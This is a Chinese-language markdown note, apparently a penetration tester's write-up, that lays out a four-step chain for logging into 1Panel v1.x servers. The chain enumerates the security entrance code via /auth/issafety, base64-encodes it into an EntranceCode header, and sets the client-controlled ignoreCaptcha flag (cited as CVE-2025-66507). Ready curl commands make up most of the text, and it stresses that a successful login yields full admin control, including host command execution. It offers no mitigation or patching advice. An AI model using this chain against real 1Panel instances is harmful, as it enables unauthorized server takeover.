# 1Panel v1.x 认证绕过链：安全入口代码可通过 /auth/issafety 枚举，配合 CVE-2025-66507（ignoreCaptcha 客户端可控）和 base64 编码的 EntranceCode header 实现无验证码登录。v1.10.10-lts 仍有此漏洞。

## 1Panel 认证绕过完整链（v1.x 系列，含 v1.10.10-lts）

### 适用版本
1Panel < 2.0.14（CVE-2025-66507 验证码绕过）

### 绕过步骤

**Step 1: 枚举安全入口代码**
```bash
# 常见入口代码字典: entrance, panel, admin, 1panel, safe, secure
curl /api/v1/auth/issafety?code=<code>
# 返回 {"code":200} 表示入口代码有效
```

**Step 2: Base64 编码入口代码**
```bash
echo -n "<entrance_code>" | base64
```

**Step 3: JWT 登录（绕过验证码）**
```bash
curl -X POST /api/v1/auth/login \
  -H "Content-Type: application/json" \
  -H "EntranceCode: <base64_encoded_entrance>" \
  -d '{"name":"<username>","password":"<password>","authMethod":"jwt","language":"zh","ignoreCaptcha":true}'
# 返回 JWT token（authMethod=jwt）或 psession cookie（authMethod=session）
```

**Step 4: 后续 API 请求**
- Session 认证：使用 `psession` cookie + `EntranceCode` header
- JWT 认证：EntranceCode header 仅用于登录请求，后续请求只需 session cookie
- 注意：只有 `/auth/login` 和 `/auth/mfalogin` 需要 EntranceCode header

### 关键发现
1. EntranceCode header 仅在 login/mfalogin 请求中被 SPA 自动添加（base64 编码的入口代码）
2. CVE-2025-66507: `ignoreCaptcha: true` 由客户端控制，服务端无验证
3. 安全入口代码可通过 `/auth/issafety` 接口无限制枚举
4. 登录成功后可完全访问 1Panel 管理功能（文件管理、主机命令执行等）
